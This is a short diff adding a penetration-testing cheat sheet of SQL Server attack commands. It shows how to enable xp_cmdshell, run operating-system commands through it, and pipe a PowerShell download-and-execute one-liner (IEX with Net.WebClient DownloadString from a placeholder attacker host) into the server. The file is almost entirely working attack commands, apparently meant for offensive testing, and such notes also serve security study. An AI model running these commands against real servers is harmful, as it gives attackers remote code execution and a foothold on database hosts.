@@ -1,0 +1,9 @@
+# enable xp_cmdshell SQL Server configuration
+mssql> enable_xp_cmdshell
+
+# execute shell command
+mssql> EXEC xp_cmdshell <command>
+
+# download string and invoke expression
+mssql> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<lhost>/<file>.txt") | powershell -noprofile'
+
